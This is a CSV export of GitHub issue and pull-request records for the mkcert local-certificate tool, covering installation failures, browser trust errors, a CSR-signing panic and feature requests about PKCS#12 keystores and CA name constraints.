FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/328,781386223,MDU6SXNzdWU3ODEzODYyMjM=,328,Firefox can't print cibc bank statement,77112668,closed,FALSE,NA,NA,1,2021-01-07T15:14:38Z,2021-01-07T15:28:45Z,2021-01-07T15:28:44Z,NONE,NA,"Firefox can't print CIBC bank statement. (Bank statement only print total three pages) . First and last pages are half blank. this same pages only see in print preview. Simplify pages get more pages. chrome, IE,Edge and safari works fine. All utility and bank statements other bills have to see properly in browser. Firefox print coding needs to improve with print preview like chrome.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/328/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/328/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/328/events,https://github.com/FiloSottile/mkcert/issues/328,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/327,779398804,MDExOlB1bGxSZXF1ZXN0NTQ5MzcyMjIx,327,Add Firefox Ubuntu Snap support #325,10164678,open,FALSE,NA,NA,0,2021-01-05T18:29:42Z,2021-01-05T18:29:42Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/327/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/327/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/327/events,https://github.com/FiloSottile/mkcert/pull/327,https://api.github.com/repos/FiloSottile/mkcert/pulls/327
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/326,777107442,MDU6SXNzdWU3NzcxMDc0NDI=,326,`mkcert -install` fails to install for Firefox on macOS,22424430,open,FALSE,NA,NA,1,2020-12-31T18:32:57Z,2021-01-10T15:08:12Z,NA,NONE,NA,"I am attempting to test rustls usage in actix-web with [this example](https://github.com/actix/examples/tree/master/rustls/). It recommended I use mkcert to set up a local CA.

It looks like mkcert was able to install it at the system level, but it gets errors when trying to install it for Firefox:

    $ mkcert -install
    The local CA is now installed in the system trust store! ⚡️
    Installing in Firefox failed. Please report the issue with details about your environment at https://github.com/FiloSottile/mkcert/issues/new 👎
    Note that if you never started Firefox, you need to do that at least once.

I have started Firefox before. The error occurs regardless of whether Firefox is started. The server can be started and accessed with `curl -k`, however Firefox returns `SEC_ERROR_UNKNOWN_ISSUER` and Chrome returns `NET::ERR_CERT_AUTHORITY_INVALID`.

System information:

- macOS 10.13.6
- Firefox 84.0.1 (64-bit)
- mkcert 1.4.3 (installed with `brew install --build-from-source`)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/326/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/326/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/326/events,https://github.com/FiloSottile/mkcert/issues/326,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/325,776402054,MDU6SXNzdWU3NzY0MDIwNTQ=,325,Installing in firefox via snap on ubuntu doesn't seem to work,1094732,open,FALSE,NA,NA,0,2020-12-30T11:10:48Z,2020-12-30T11:10:48Z,NA,NONE,NA,"I'm running firefox on my ubuntu 20.10 installed via snap and via apt. The apt version does accept the certificates. The snap version does not.

Snap Firefox is installed on `/snap/firefox/current/firefox`

These are the files in that directory:
![Screenshot from 2020-12-30 12-10-09](https://user-images.githubusercontent.com/1094732/103347696-012ad200-4a98-11eb-9a30-de07678ee3eb.png)

II don't know what more information that I can provide?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/325/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/325/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/325/events,https://github.com/FiloSottile/mkcert/issues/325,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/324,776346514,MDU6SXNzdWU3NzYzNDY1MTQ=,324,Can i specify the expiration date instead of 2 years 3 month?,3828277,closed,FALSE,NA,NA,1,2020-12-30T08:58:46Z,2021-01-24T15:40:24Z,2021-01-24T15:40:24Z,NONE,NA,"https://github.com/FiloSottile/mkcert/blob/1a5aaff12e0edb54f32ce187079d05c4a1ffd19b/cert.go#L62

I need more longer expiration time for self signed certs, not only for IOS/MAC.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/324/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/324/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/324/events,https://github.com/FiloSottile/mkcert/issues/324,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/323,775710302,MDU6SXNzdWU3NzU3MTAzMDI=,323,import cycle not allowed,17896319,closed,FALSE,NA,NA,1,2020-12-29T05:44:02Z,2020-12-29T08:54:53Z,2020-12-29T08:54:24Z,NONE,NA,"I tried to build from source, used cmd in readme says

git clone https://github.com/FiloSottile/mkcert && cd mkcert
go build -ldflags ""-X main.Version=$(git describe --tags)""

then
import cycle not allowed
package .
	imports bytes
	imports errors
	imports internal/reflectlite
	imports internal/unsafeheader
	imports runtime
	imports internal/bytealg
	imports internal/cpu
	imports runtime

What should I do?
my go version is ”go version go1.9.4 linux/amd64“",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/323/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/323/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/323/events,https://github.com/FiloSottile/mkcert/issues/323,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/322,774060617,MDU6SXNzdWU3NzQwNjA2MTc=,322,"failed to execute ""security add-trusted-cert""",360222,open,FALSE,NA,NA,2,2020-12-23T21:51:43Z,2021-01-24T16:00:15Z,NA,NONE,NA,"I am running 

```
mkcert -install
```

under rosetta 2 on an M1 and em getting this output:

```
Sudo password:
ERROR: failed to execute ""security add-trusted-cert"": exit status 1

SecTrustSettingsSetTrustSettings: One or more parameters passed to a function were not valid.
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/322/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/322/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/322/events,https://github.com/FiloSottile/mkcert/issues/322,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/321,769447720,MDU6SXNzdWU3Njk0NDc3MjA=,321,Linuxbrew homepage update readme,37009464,closed,FALSE,NA,NA,1,2020-12-17T02:54:45Z,2021-02-19T14:58:09Z,2021-02-19T14:58:09Z,NONE,NA,Linuxbrew is no longer in http://linuxbrew.sh/ but has been merged into https://brew.sh/ . I'll create a PR regarding the change in readme,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/321/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/321/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/321/events,https://github.com/FiloSottile/mkcert/issues/321,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/320,761035675,MDU6SXNzdWU3NjEwMzU2NzU=,320,brew install mkcert failed,16096724,open,FALSE,NA,NA,1,2020-12-10T08:46:48Z,2020-12-10T14:00:54Z,NA,NONE,NA,"curl: (22) The requested URL returned error: 404 Not Found
Error: Failed to download resource ""mkcert""
Download failed: http://7xkcej.dl1.z0.glb.clouddn.com/bottles/mkcert-1.4.2.catalina.bottle.tar.gz

Warning: Bottle installation failed: building from source.
==> Downloading http://7xkcej.dl1.z0.glb.clouddn.com/bottles/go-1.15.3.catalina.
#=#=#
curl: (22) The requested URL returned error: 404 Not Found
Error: Failed to download resource ""go""
Download failed: http://7xkcej.dl1.z0.glb.clouddn.com/bottles/go-1.15.3.catalina.bottle.tar.gz
Warning: Bottle installation failed: building from source.
==> Cloning https://go.googlesource.com/tools.git
Cloning into '/Users/jasonli/Library/Caches/Homebrew/go--gotools--git'...
fatal: unable to access 'https://go.googlesource.com/tools.git/': Failed to connect to go.googlesource.com port 443: Operation timed out
Error: Failed to download resource ""go--gotools""
Failure while executing; `git clone --branch release-branch.go1.15 -c advice.detachedHead=false https://go.googlesource.com/tools.git /Users/jasonli/Library/Caches/Homebrew/go--gotools--git` exited with 128. Here's the output:
Cloning into '/Users/jasonli/Library/Caches/Homebrew/go--gotools--git'...
fatal: unable to access 'https://go.googlesource.com/tools.git/': Failed to connect to go.googlesource.com port 443: Operation timed out",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/320/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/320/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/320/events,https://github.com/FiloSottile/mkcert/issues/320,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/319,757508262,MDU6SXNzdWU3NTc1MDgyNjI=,319,Chrome has to be run at least once before mkcert notices it,583995,closed,FALSE,NA,NA,1,2020-12-05T01:48:13Z,2020-12-07T16:19:35Z,2020-12-07T16:19:35Z,NONE,NA,"If Chrome is installed but has never been run, `mkcert -install` doesn't install the CA to its trust store. Not really an issue on a desktop, but I was trying to get mkcert running in a CircleCI build and ran into it. If it can't be fixed, it should at least be documented:

Workaround (for CircleCI): start Chrome and kill it before running `mkcert -install`.

```
      - run:
          name: Start Chrome so that mkcert sees it
          command: |
            /opt/google/chrome/google-chrome &
            sleep 3
            killall chrome
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/319/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/319/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/319/events,https://github.com/FiloSottile/mkcert/issues/319,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/318,755771941,MDU6SXNzdWU3NTU3NzE5NDE=,318,Cannot sign csr get panic error,4530798,open,FALSE,NA,NA,3,2020-12-03T02:57:20Z,2021-02-24T22:27:29Z,NA,NONE,NA,"I generated a csr on an appliance I use, and when I use the following:

```
mkcert -csr my.test.csr
```

I get:

```

goroutine 1 [running]:
main.(*mkcert).fileNames(0xc000155f00, 0x0, 0x0, 0x0, 0x0, 0x0, 0x121fc40, 0xc000066300, 0xc00042c000, 0x46b)
	/private/tmp/mkcert-20201126-82459-i1bflq/mkcert-1.4.3/src/github.com/FiloSottile/mkcert/cert.go:177 +0x3cc
main.(*mkcert).makeCertFromCSR(0xc000155f00)
	/private/tmp/mkcert-20201126-82459-i1bflq/mkcert-1.4.3/src/github.com/FiloSottile/mkcert/cert.go:266 +0x7c8
main.(*mkcert).Run(0xc000155f00, 0xc0000121d0, 0x0, 0x0)
	/private/tmp/mkcert-20201126-82459-i1bflq/mkcert-1.4.3/src/github.com/FiloSottile/mkcert/main.go:203 +0x64a
main.main()
	/private/tmp/mkcert-20201126-82459-i1bflq/mkcert-1.4.3/src/github.com/FiloSottile/mkcert/main.go:145 +0x851
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/318/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/318/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/318/events,https://github.com/FiloSottile/mkcert/issues/318,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/317,752649845,MDExOlB1bGxSZXF1ZXN0NTI4OTI5NzM1,317,Set explicit password for pkcs 12 keystores,4471131,open,FALSE,NA,NA,0,2020-11-28T10:36:25Z,2020-11-28T10:36:25Z,NA,NONE,NA,"Added one new command line flag:

	-p12-password
		Explicitly set the password of the PKCS #12 file,
		the same password is used for both the keystore and the keypair.
		Empty passwords are NOT allowed.

If this is not set, behaviour is unchanged.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/317/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/317/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/317/events,https://github.com/FiloSottile/mkcert/pull/317,https://api.github.com/repos/FiloSottile/mkcert/pulls/317
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/316,752254537,MDU6SXNzdWU3NTIyNTQ1Mzc=,316,"Set explicit alias, store and key password for pkcs 12 keystores",4471131,closed,FALSE,NA,NA,2,2020-11-27T13:28:30Z,2020-11-28T10:39:34Z,2020-11-27T13:35:51Z,NONE,NA,"mkcert can be configured to create a pkcs#12 keystore. However:
* the alias is hardcoded to 1
* the keystore password is hardcoded to “changeit”
* the key password is hardcoded to “changeit”

It should be possible to set these 3 properties explicitly e.g.

```
mkcert -pkcs12 -p12-file acme_demo.p12 \
       -alias acme_demo \
       -storepass t0ps3cret! \
       -keypass C0nfiden!al \
       acme.demo localhost 127.0.0.1
```

Why? This would create a valid keystore in one step, that could be directly used by a Java Application Server. Yes I can take the current  p12 file from mkcert, and use Java keytool or openssl to change the passwords, but those are extra steps.

A one-line, one-tool solution would be cool!

Both mkcert -help and this issue https://github.com/FiloSottile/mkcert/issues/20 suggest that the pkcs#12 is a legacy / dying format. I wonder if that is a golang perception?  As of Java 9, pkcs#12 is the default keystore format, replacing the java jks format. That suggests that pkcs#12 is alive and kicking. I agree though that it is a nasty format, but it is not dying!

My goal is to be able to create development keystores as easily as possible, that contain proper valid certificates accepted by Firefox, Chrome, Edge etc., thus enabling developers to “do https properly” from day one. ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/316/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/316/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/316/events,https://github.com/FiloSottile/mkcert/issues/316,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/315,752107084,MDU6SXNzdWU3NTIxMDcwODQ=,315,[feature request] support loading encrypted private keys,5780637,closed,FALSE,NA,NA,2,2020-11-27T09:25:23Z,2020-11-27T13:48:32Z,2020-11-27T13:38:10Z,NONE,NA,"I'm not only using mkcert to generate & load certificates but also to load certificates from 3rd parties.

When trying to load one that has encription I get this error:

> ERROR: failed to parse the CA key: asn1: structure error: length too larg

Is related with this issue?

https://github.com/golang/go/issues/18692

I'm not into certificates, crypto, etc.. so sorry if this is a silly request/issue.

Thank you for this awesome tool @FiloSottile !",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/315/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/315/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/315/events,https://github.com/FiloSottile/mkcert/issues/315,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/314,750801710,MDExOlB1bGxSZXF1ZXN0NTI3NDMxNjk3,314,Fix and update CI analyzers,1225294,closed,FALSE,NA,NA,0,2020-11-25T13:04:53Z,2020-11-25T13:09:47Z,2020-11-25T13:09:46Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/314/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/314/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/314/events,https://github.com/FiloSottile/mkcert/pull/314,https://api.github.com/repos/FiloSottile/mkcert/pulls/314
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/313,750745837,MDU6SXNzdWU3NTA3NDU4Mzc=,313,Chrome error ERR_CERT_VALIDITY_TOO_LONG with mkcert 1.4.2,4471131,closed,FALSE,NA,NA,13,2020-11-25T11:41:10Z,2020-11-26T13:29:27Z,2020-11-25T13:17:25Z,NONE,NA,"This is a follow on to the issue ""Chrome error ERR_CERT_VALIDITY_TOO_LONG #238"". I am opening a new issue as requested by FiloSottile.

I have a fresh install of mkcert 1.4.2 on MacOS 10.15.7 made last night via HomeBrew.

This creates certificates with 10 years validity, which are rejected by Chrome 87.0.4280.67 with ERR_CERT_VALIDITY_TOO_LONG.

From the comments in the issue #238 I understood that the standard validity in 1.4.2 should no longer be 10 years.

Both the Root Authority and a certificate created by it are valid 10 years:

Root Certificate Authority
Expires: Sunday, 24 November 2030 at 23:14:42 Central European Standard Time

Certificate Created with “mkcert -csr xxxx”
Expires: Monday, 25 November 2030 at 11:09:18 Central European Standard Time

The commands I ran were:
```
brew install mkcert
brew install nss
mkcert -install

mkcert -key-file mkcertRootCA.key -cert-file mkcertRootCA.pem acme.demo localhost 127.0.0.1

-- Create the keystore which will be used by the Java Application Server
keytool -genkey -alias acme_demo -keyalg RSA -keysize 2048 -keystore acme_demo.jks -dname ""CN=acme.demo, O=ACME, L=Zurich, ST=ZH, C=CH""

-- Create the Certficate Signing Request (CSR) which will be ""sent"" to the Certificate Authority - in this case mkcert
keytool -certreq -alias acme_demo -file acme_demo.csr -keystore acme_demo.jks

-- Create the certificate that will be imported to the keystore of the Java Application Server
mkcert -csr acme_demo.csr

-- Import the certificate from the Certifcate Authority mkcert to the the keystore of the Java Application Server
sudo keytool -importcert -alias acme_demo -keystore acme_demo.jks -file acme.demo.pem -trustcacerts

-- Optionally import the certificate of the mkcert authority into any additional JREs (not set as JAVA_HOME) used by java rich clients e.g.
sudo keytool -importcert -alias ""mkcert development ca"" -keystore /Library/Java/JavaVirtualMachines/adoptopenjdk-11.jdk/Contents/Home/lib/security/cacerts -storepass changeit -file mkcertRootCA.pem
```

This process is essentially the same as I would follow using an ""official"" Certificate Authority.


Viewing the certificate with Java keytool gives:
```
keytool -printcert -file acme.demo.pem 
Owner: CN=acme.demo, O=ACEM, L=Zurich, ST=ZH, C=CH
Issuer: CN=mkcert christopherlamb@ApplePippa (Christopher Lamb), OU=christopherlamb@ApplePippa (Christopher Lamb), O=mkcert development CA
Serial number: 79d89587d8a247e2948151717b4dcc7
Valid from: Wed Nov 25 11:09:18 CET 2020 until: Mon Nov 25 11:09:18 CET 2030
```

I will try an install on Windows 10 next.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/313/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/313/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/313/events,https://github.com/FiloSottile/mkcert/issues/313,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/312,748273873,MDU6SXNzdWU3NDgyNzM4NzM=,312,Certificate issue in iOS 14,5508598,closed,FALSE,NA,NA,2,2020-11-22T16:03:02Z,2020-11-22T16:35:06Z,2020-11-22T16:16:19Z,NONE,NA,"Hi. I am using mkcert and it works great on my mac. Also it worked fine on the iOS 13. But on 14 iOS I have an issue
![IMG_5475](https://user-images.githubusercontent.com/5508598/99908701-b7a6d480-2cec-11eb-8534-5d8e411f2f9a.PNG)
I have done all steps from the readme. But still no success. What could be wrong?
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/312/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/312/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/312/events,https://github.com/FiloSottile/mkcert/issues/312,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/311,747673689,MDExOlB1bGxSZXF1ZXN0NTI0ODU0MzYw,311,Switch to GitHub Actions,1225294,closed,FALSE,NA,NA,0,2020-11-20T17:34:16Z,2021-03-21T05:55:05Z,2020-11-20T19:48:11Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/311/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/311/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/311/events,https://github.com/FiloSottile/mkcert/pull/311,https://api.github.com/repos/FiloSottile/mkcert/pulls/311
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/310,746211376,MDExOlB1bGxSZXF1ZXN0NTIzNjQ2Nzk1,310,[modify] 発行者を環境変数から取得できるよう修正,73807276,closed,FALSE,NA,NA,1,2020-11-19T03:16:30Z,2020-11-19T03:18:23Z,2020-11-19T03:17:19Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/310/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/310/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/310/events,https://github.com/FiloSottile/mkcert/pull/310,https://api.github.com/repos/FiloSottile/mkcert/pulls/310
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/309,745588851,MDExOlB1bGxSZXF1ZXN0NTIzMTI2MTEy,309,Add DNS whitelist option to CA generation,20319565,open,FALSE,NA,NA,0,2020-11-18T11:44:51Z,2020-11-18T11:44:51Z,NA,NONE,NA,"This uses the `NameConstraints` extension to allow for DNS whitelisting on the local CA when it is first generated.

I'm aware that [you've rejected this kind of change before](https://github.com/FiloSottile/mkcert/pull/113#issuecomment-459999460), but I want to clarify why this version is different, addressing those points:

 * This is totally opt-in, and it's not just on `localhost`. You can use this to produce a minimally-responsible CA for any set of domains, as normal.
 *  This makes explicit in the option help that compliance with the whitelist is optional, and cannot be relied on for security purposes.
 * While I agree that being able to read the local private key and therefore forge certificates issued by the local CA is a big pwn, there are two benefits to restricting the local CA:
    1. It allows for certainty that the CA itself has a minimal responsibility, and therefore that different CAs (used for different development purposes) do not overlap in their issuance in a way that would cause problems outside of testing/development.
    2.  If the user's stack *does* check `NameConstraints`, then by Swiss Cheese, it is simply an improvement to security in the unlikely case that a remote attacker tricks the user into issuing a certificate from their local CA. But of course, this is a very minor benefit.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/309/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/309/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/309/events,https://github.com/FiloSottile/mkcert/pull/309,https://api.github.com/repos/FiloSottile/mkcert/pulls/309
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/308,745573134,MDU6SXNzdWU3NDU1NzMxMzQ=,308,choco install mkcert failed,16096724,closed,FALSE,NA,NA,2,2020-11-18T11:21:42Z,2020-11-22T16:19:51Z,2020-11-22T16:19:51Z,NONE,NA,"Failures
 - mkcert - mkcert not installed. The package was not found with the source(s) listed.
 Source(s): 'https://chocolatey.org/api/v2/'
 NOTE: When you specify explicit sources, it overrides default sources.
If the package version is a prerelease and you didn't specify `--pre`,
 the package may not be found.
Please see https://chocolatey.org/docs/troubleshooting for more
 assistance.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/308/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/308/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/308/events,https://github.com/FiloSottile/mkcert/issues/308,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/307,743068095,MDU6SXNzdWU3NDMwNjgwOTU=,307,Your connection is not private / NET::ERR_CERT_AUTHORITY_INVALID  on windows 10,151924,closed,FALSE,NA,NA,6,2020-11-14T19:51:02Z,2020-11-14T20:02:59Z,2020-11-14T19:58:54Z,NONE,NA,"I just did the following, in a docker container:

```
mkcert eventapp.local ""eventapp.local"" ""localhost"" 127.0.0.1 ::1
```

Then I tried using that in nginx.   Then in the host machine (windows) I ran:

```
mkcert -install
```

if I re-run that, it says its already installed:

```
.\mkcert.exe -install
The local CA is already installed in the system trust store! 👍
Note: Firefox support is not available on your platform. ℹ️
```

But when I try to go to http://eventapp.local in chrome:

```
Subject: mkcert development certificate

Issuer: mkcert root@buildkitsandbox

Expires on: Feb 14, 2023

Current date: Nov 14, 2020

PEM encoded chain:
-----BEGIN CERTIFICATE-----
MIIEUTCCArmgAwIBAgIQWCng0+tt46H79dtMnkm8EjANBgkqhkiG9w0BAQsFADBl
MR4wHAYDVQQKExVta2NlcnQgZGV2ZWxvcG1lbnQgQ0ExHTAbBgNVBAsMFHJvb3RA
YnVpbGRraXRzYW5kYm94MSQwIgYDVQQDDBtta2NlcnQgcm9vdEBidWlsZGtpdHNh
bmRib3gwHhcNMjAxMTE0MTkxMjE2WhcNMjMwMjE0MTkxMjE2WjBIMScwJQYDVQQK
Ex5ta2NlcnQgZGV2ZWxvcG1lbnQgY2VydGlmaWNhdGUxHTAbBgNVBAsMFHJvb3RA
YnVpbGRraXRzYW5kYm94MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
tc9R2aRnW+25/MIJP0r4/SqStL0Bxqb83jSmvw2j3VV6Z3kGCySNQzDULMq8J+w4
fO/xGwf6Hm7FR6/Wq2F0R/RriPW0hNRTAU8v6mLs2WYspvCQ7BkmJ5m9kKMZyi1z
BTGtPABacxSledVVMxHmMvjWG857zCtVpeaMab1jBqfBGN2bpZAGNaP6vrdO5O/w
CyexsTpNco96tliAioNAAbzmu4pq6XenIbDIwi8chtOOAtfBnvB+NSoBeOEOvGUY
R37IzafuKL/OZ5KtcY3sQ1bz++I8sklOdoqbG3AWfups1pgsZUzlBmnvU+Cn0A4B
cHatrPI9tKGLJYpVnW+o+wIDAQABo4GZMIGWMA4GA1UdDwEB/wQEAwIFoDATBgNV
HSUEDDAKBggrBgEFBQcDATAfBgNVHSMEGDAWgBQU4pHNU/GJLgyHgPbYb0Y5gvHR
0jBOBgNVHREERzBFgg5ldmVudGFwcC5sb2NhbIIQKi5ldmVudGFwcC5sb2NhbIIJ
bG9jYWxob3N0hwR/AAABhxAAAAAAAAAAAAAAAAAAAAABMA0GCSqGSIb3DQEBCwUA
A4IBgQDm86yF5Oy3tC1qC7C7Rdqzf2PRKVzfXzytloeB5nbRWcp0fIfzeE7kD6T+
Q+pCjeNSoeCmCTjLFJCEdvSU0xFBdyybYTSga4+Pfz7a60mEa+WZp+sOliCRKmsw
fGwwQTw3SRs7oVWnJZeq+aEKyANPmKs3JLuuUL7KtToPna8z1d9kBRzMhZDFdVvZ
YcMtnl77RKcOFDNHq8uAn5w3GRPRF0DLGJg+5OeYHKKe6PCMw7x4h3t61ZWiiMQp
cuji1pohrPZAPSp1oPb1biuVRD8QvBZ3cRC42m8lK1hfeHGjCm1w4GZw7rgDf6os
pL1dZZy0IZLWhgfpD1WmmxcxZD2FlhUK6G3Roe/SWM2eV1Lfy70Sz2L2TuZWNy39
2FU0J/Oyu0BAx96PvyGU27XMMSslDfabATbzYLQ0bLP6o2uDqZ+TzbQT5AKRZe6r
n5vcH+desrjLpGo9YcA8CkkZietqH6n9pPQWraZ34wIE9VLNmanCOaFLbpdv+IAl
PXMieYM=
-----END CERTIFICATE-----
```

![image](https://user-images.githubusercontent.com/151924/99155749-a536f600-266f-11eb-99ce-ab657558ec96.png)

Any idea what might cause this?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/307/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/307/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/307/events,https://github.com/FiloSottile/mkcert/issues/307,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/306,735576672,MDU6SXNzdWU3MzU1NzY2NzI=,306,update-ca-certificates rehash error (hash table overflow),41798,closed,FALSE,NA,NA,1,2020-11-03T19:22:16Z,2020-11-22T16:18:42Z,2020-11-22T16:18:42Z,NONE,NA,"__Encountered with mkcert version 1.4.1.__

I’m not entirely sure why this started happening today but I’m going to document it here in case it helps anyone else.

When running my tests (which generate certificate authorities), I started encountering the following error:

```
Command failed: /home/aral/.small-tech.org/auto-encrypt-localhost/mkcert-v1.4.1-linux-amd64 -install
    Created a new local CA at ""/home/aral/.small-tech.org/auto-encrypt-localhost"" 💥
    ERROR: failed to execute ""update-ca-certificates"": exit status 134
    Updating certificates in /etc/ssl/certs...
    rehash: error: hash table overflow for mkcert_development_CA_76913251760376997753161041127229202716.pem
    rehash: error: hash table overflow for mkcert_development_CA_300360415125013060185903208978231170143.pem
    rehash: error: hash table overflow for mkcert_development_CA_153594660651925404699929286764783442924.pem
    rehash: error: hash table overflow for mkcert_development_CA_3243189055737429532705980019443809730.pem
    rehash: error: hash table overflow for mkcert_development_CA_335614305519919366026232901584440763094.pem
    rehash: error: hash table overflow for mkcert_development_CA_153594660651925404699929286764783442924.pem
    rehash: error: hash table overflow for mkcert_development_CA_335614305519919366026232901584440763094.pem
    rehash: error: hash table overflow for mkcert_development_CA_76913251760376997753161041127229202716.pem
    *** buffer overflow detected ***: terminated
```

Running `sudo update-ca-certifiates -f` by itself gave me the same error.

Given that it started happening without any other changes, I started wondering if it had to do with the sheer number of mkcert root CAs I had generated while running my tests over however many months/years.

So I tried:

```shell
 sudo rm /usr/local/share/ca-certificates/mkcert_development_CA_*
```

followed by:

```shell
sudo update-ca-certifiates -f
```

And that solved the issue.

The output of that last command informed me that 426 previously-trusted certificates were now removed.

I’m pretty sure most folks won’t run into this unless they’re testing a tool like [auto-encrypt-localhost](https://github.com/small-tech/auto-encrypt-localhost) that uses mkcert to generate certificate authorities and certificates and tests them but still, in case anyone does, I hope this issue helps.

